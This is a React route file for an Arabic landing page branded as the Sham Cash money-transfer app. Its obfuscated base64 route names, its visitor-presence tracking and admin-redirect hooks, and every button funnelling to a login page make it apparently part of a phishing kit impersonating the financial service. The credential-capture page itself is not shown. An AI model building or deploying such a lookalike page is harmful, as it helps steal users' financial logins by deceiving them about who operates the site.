import { createFileRoute, Link } from "@tanstack/react-router";
import {
  ShieldCheck,
  Zap,
  Headset,
  ArrowLeftRight,
  Gauge,
  MousePointerClick,
  LockKeyhole,
  BadgePercent,
  LayoutGrid,
  ArrowLeft,
  Menu,
  X,
} from "lucide-react";
import { useState } from "react";
import shamLogo from "@/assets/sham-login-logo.webp";
import { usePresenceTracker } from "@/lib/presence";
import { useAdminRedirect } from "@/lib/admin-redirect";
import { useReveal } from "@/lib/use-reveal";

const TITLE = "شام كاش | الصفحة الرئيسية — إدارة معاملاتك المالية بسهولة وأمان";
const DESCRIPTION =
  "شام كاش: الحل الأمثل لإدارة معاملاتك المالية — إرسال واستلام الأموال بسرعة وسلاسة، بأعلى معايير الأمان وبدون رسوم خفية.";
const OG_IMAGE = "https://shamcashappsy.com/og-share-v4.jpg?v=5";

export const Route = createFileRoute("/aG9tZQ")({
  head: () => ({
    meta: [
      { title: TITLE },
      { name: "description", content: DESCRIPTION },
      { property: "og:title", content: TITLE },
      { property: "og:description", content: DESCRIPTION },
      { property: "og:type", content: "website" },
      { property: "og:site_name", content: "شام كاش" },
      { property: "og:locale", content: "ar_SY" },
      { property: "og:image", content: OG_IMAGE },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:title", content: TITLE },
      { name: "twitter:description", content: DESCRIPTION },
      { name: "twitter:image", content: OG_IMAGE },
    ],
  }),
  component: HomePage,
});

const NAV = [
  { href: "#top", label: "الرئيسية" },
  { href: "#features", label: "المزايا" },
  { href: "#services", label: "الخدمات" },
  { href: "#contact", label: "تواصل معنا" },
];

const WHY = [
  {
    icon: Headset,
    title: "الدعم",
    text: "فريق الدعم الخاص بنا متواجد على مدار الساعة للرد على استفساراتك وحل أي مشاكل قد تواجهها، لضمان تجربة استخدام سلسة وخالية من العقبات.",
  },
  {
    icon: ShieldCheck,
    title: "الأمان",
    text: "تطبيقنا مصمم بأعلى معايير الأمان لحماية بياناتك ومعاملاتك المالية، مما يضمن لك تجربة موثوقة وآمنة في كل خطوة.",
  },
  {
    icon: Zap,
    title: "السرعة",
    text: "تطبيقنا يتميز بالسرعة العالية لتنفيذ العمليات، مما يضمن تجربة فورية وسلسة تلبي احتياجاتك في أي وقت.",
  },
];

const FEATURES = [
  { icon: ArrowLeftRight, title: "سهولة التحويل بين المستخدمين", text: "أرسل واستقبل الأموال بسهولة وسلاسة بين مستخدمي التطبيق." },
  { icon: Gauge, title: "سرعة العمليات", text: "نفّذ معاملاتك المالية بسرعة فائقة دون أي تأخير." },
  { icon: MousePointerClick, title: "سهولة الاستخدام", text: "واجهة تطبيق بسيطة ومباشرة تسهل عليك إجراء العمليات دون تعقيد." },
  { icon: LockKeyhole, title: "أمان الأموال", text: "نضمن حماية كاملة لأموالك ومعاملاتك باستخدام أحدث تقنيات الأمان." },
  { icon: BadgePercent, title: "بدون رسوم", text: "استمتع بخدماتنا المالية بدون أي رسوم خفية، لتبقى كل معاملاتك واضحة وشفافة." },
  { icon: LayoutGrid, title: "الخدمات", text: "نوفر مجموعة من الخدمات المتنوعة التي تلبي احتياجاتك اليومية وتوفر عليك الوقت والجهد." },
];

function HomePage() {
  usePresenceTracker({ page: "/aG9tZQ" });
  useAdminRedirect();
  useReveal();
  const [menuOpen, setMenuOpen] = useState(false);

  return (
    <main dir="rtl" lang="ar" id="top" className="relative min-h-dvh bg-background text-foreground">
      {/* ترويسة */}
      <header className="sticky top-0 z-40 border-b border-border/50 bg-background/80 backdrop-blur-md">
        <div className="mx-auto flex h-16 w-full max-w-5xl items-center justify-between px-4">
          <a href="#top" className="flex items-center gap-2">
            <img src={shamLogo} alt="شام كاش" width={36} height={36} className="size-9 rounded-xl object-contain" />
            <span className="text-lg font-black text-foreground">شام كاش</span>
          </a>

          <nav className="hidden items-center gap-6 md:flex" aria-label="التنقل الرئيسي">
            {NAV.map((item) => (
              <a
                key={item.href}
                href={item.href}
                className="text-sm font-semibold text-muted-foreground transition-colors hover:text-foreground"
              >
                {item.label}
              </a>
            ))}
          </nav>

          <div className="flex items-center gap-2">
            <Link
              to="/YXV0aA"
              className="hidden min-h-10 items-center justify-center rounded-xl border border-primary/60 px-5 text-sm font-black text-foreground transition-colors hover:bg-primary/10 md:inline-flex"
            >
              تسجيل الدخول
            </Link>
            <button
              type="button"
              onClick={() => setMenuOpen((v) => !v)}
              aria-label={menuOpen ? "إغلاق القائمة" : "فتح القائمة"}
              className="inline-flex size-10 items-center justify-center rounded-xl border border-border/60 text-foreground md:hidden"
            >
              {menuOpen ? <X className="size-5" aria-hidden /> : <Menu className="size-5" aria-hidden />}
            </button>
          </div>
        </div>

        {menuOpen ? (
          <nav className="border-t border-border/50 bg-background px-4 py-3 md:hidden" aria-label="قائمة الجوال">
            <div className="grid gap-1">
              {NAV.map((item) => (
                <a
                  key={item.href}
                  href={item.href}
                  onClick={() => setMenuOpen(false)}
                  className="rounded-lg px-3 py-2.5 text-sm font-semibold text-muted-foreground transition-colors hover:bg-secondary hover:text-foreground"
                >
                  {item.label}
                </a>
              ))}
              <Link
                to="/YXV0aA"
                className="mt-2 flex min-h-11 items-center justify-center rounded-xl border border-primary/60 text-sm font-black text-foreground"
              >
                تسجيل الدخول
              </Link>
            </div>
          </nav>
        ) : null}
      </header>

      {/* البطل */}
      <section className="relative overflow-hidden">
        <div className="splash-glow" aria-hidden />
        <div className="mx-auto flex w-full max-w-3xl flex-col items-center px-4 pb-20 pt-16 text-center sm:pt-24">
          <span className="text-sm font-black text-accent" data-reveal="">شام كاش</span>
          <h1 className="mt-3 text-balance text-[clamp(2rem,7vw,3.4rem)] font-black leading-[1.15] text-foreground" data-reveal="">
            تطبيق{" "}
            <span className="bg-gradient-to-l from-accent to-primary bg-clip-text text-transparent">شام كاش</span>{" "}
            متوفر الآن
          </h1>
          <p className="mt-5 max-w-[52ch] text-balance text-[15px] leading-8 text-muted-foreground sm:text-base" data-reveal="">
            نسعى لتوفير منصة موثوقة وآمنة تتيح للمستخدمين إجراء المعاملات المالية بسهولة ومرونة. هدفنا هو تمكين
            الأفراد من إدارة شؤونهم المالية بكفاءة وشفافية.
          </p>
          <p className="mt-6 text-sm font-semibold text-muted-foreground" data-reveal="">حمّل التطبيق واستمتع بخدماتنا</p>
          <Link
            to="/YXV0aA"
            data-reveal=""
            className="btn-shine mt-4 inline-flex min-h-12 items-center justify-center gap-2 rounded-xl border border-primary/70 px-10 text-base font-black text-foreground transition-all hover:-translate-y-0.5 hover:bg-primary/10 hover:shadow-[0_10px_30px_-10px_var(--primary)]"
          >
            تسجيل الدخول
            <ArrowLeft className="size-4 shrink-0" aria-hidden />
          </Link>
        </div>
      </section>

      {/* حول */}
      <section className="mx-auto w-full max-w-3xl px-4 pb-16">
        <div className="rounded-3xl border border-border/60 bg-card p-8 text-center sm:p-10" data-reveal="">
          <h2 className="text-2xl font-black text-foreground">حول</h2>
          <span className="mx-auto mt-3 block h-0.5 w-12 rounded-full bg-accent" aria-hidden />
          <p className="mt-6 text-[15px] leading-8 text-muted-foreground">
            تطبيقنا هو الحل الأمثل لإدارة معاملاتك المالية بسهولة وأمان يتيح لك إرسال واستلام الأموال بسرعة وسلاسة،
            مع واجهة استخدام بسيطة وتجربة مريحة نسعى من خلاله إلى تقديم خدمات مالية مبتكرة تضمن الشفافية والموثوقية،
            مما يتيح لك التحكم الكامل بأموالك في أي وقت ومن أي مكان.
          </p>
        </div>
      </section>

      {/* لماذا شام كاش */}
      <section className="mx-auto w-full max-w-5xl px-4 pb-16">
        <h2 className="text-center text-2xl font-black text-foreground">لماذا شام كاش</h2>
        <span className="mx-auto mt-3 block h-0.5 w-12 rounded-full bg-accent" aria-hidden />
        <div className="mt-8 grid gap-4 sm:grid-cols-3">
          {WHY.map((item) => (
            <article
              key={item.title}
              data-reveal=""
              className="rounded-3xl border border-border/60 bg-card p-6 text-center transition-all duration-300 hover:-translate-y-1 hover:border-accent/40 hover:shadow-[0_18px_40px_-18px_var(--accent)]"
            >
              <span className="mx-auto flex size-12 items-center justify-center rounded-2xl bg-accent/15 text-accent">
                <item.icon className="size-6" aria-hidden />
              </span>
              <h3 className="mt-4 text-lg font-black text-foreground">{item.title}</h3>
              <p className="mt-3 text-[14px] leading-7 text-muted-foreground">{item.text}</p>
            </article>
          ))}
        </div>
      </section>

      {/* المزايا */}
      <section id="features" className="mx-auto w-full max-w-5xl scroll-mt-20 px-4 pb-16">
        <h2 className="text-center text-2xl font-black text-foreground">المزايا</h2>
        <span className="mx-auto mt-3 block h-0.5 w-12 rounded-full bg-accent" aria-hidden />
        <p className="mx-auto mt-5 max-w-[60ch] text-center text-[15px] leading-8 text-muted-foreground">
          يقدم تطبيقنا مجموعة من المزايا المصممة لتلبية احتياجاتك بكل احترافية، منها السرعة في تنفيذ العمليات،
          السهولة في الاستخدام، أعلى مستويات الأمان، وخدمات بدون رسوم خفية.
        </p>
        <div className="mt-8 grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
          {FEATURES.map((item) => (
            <article
              key={item.title}
              data-reveal=""
              className="rounded-3xl border border-border/60 bg-card p-6 transition-all duration-300 hover:-translate-y-1 hover:border-accent/40"
            >
              <span className="flex size-11 items-center justify-center rounded-2xl bg-accent/15 text-accent">
                <item.icon className="size-5" aria-hidden />
              </span>
              <h3 className="mt-4 text-base font-black text-foreground">{item.title}</h3>
              <p className="mt-2 text-[14px] leading-7 text-muted-foreground">{item.text}</p>
            </article>
          ))}
        </div>
      </section>

      {/* الخدمات / دعوة أخيرة */}
      <section id="services" className="mx-auto w-full max-w-3xl scroll-mt-20 px-4 pb-16">
        <div className="rounded-3xl border border-primary/40 bg-card p-8 text-center sm:p-10" data-reveal="">
          <h2 className="text-2xl font-black text-foreground">جاهز للبدء؟</h2>
          <p className="mt-4 text-[15px] leading-8 text-muted-foreground">
            سجّل دخولك الآن واستمتع بكل خدمات شام كاش مباشرة من المتصفح — بدون متجر تطبيقات.
          </p>
          <Link
            to="/YXV0aA"
            className="mt-6 inline-flex min-h-12 items-center justify-center gap-2 rounded-xl bg-primary px-10 text-base font-black text-primary-foreground transition-opacity hover:opacity-90"
          >
            تسجيل الدخول الآن
            <ArrowLeft className="size-4 shrink-0" aria-hidden />
          </Link>
        </div>
      </section>

      {/* تواصل معنا */}
      <section id="contact" className="mx-auto w-full max-w-3xl scroll-mt-20 px-4 pb-20">
        <div className="rounded-3xl border border-border/60 bg-card p-8 text-center sm:p-10" data-reveal="">
          <h2 className="text-2xl font-black text-foreground">تواصل معنا</h2>
          <span className="mx-auto mt-3 block h-0.5 w-12 rounded-full bg-accent" aria-hidden />
          <p className="mt-6 text-[15px] leading-8 text-muted-foreground">
            إذا كان لديك أي استفسار أو ملاحظة، لا تتردد في التواصل معنا. فريق الدعم متواجد دائماً لمساعدتك.
          </p>
        </div>
      </section>

      <footer className="border-t border-border/50 py-6 text-center text-xs font-semibold text-muted-foreground">
        شام كاش — معاملاتك المالية بسهولة وأمان
      </footer>
    </main>
  );
}
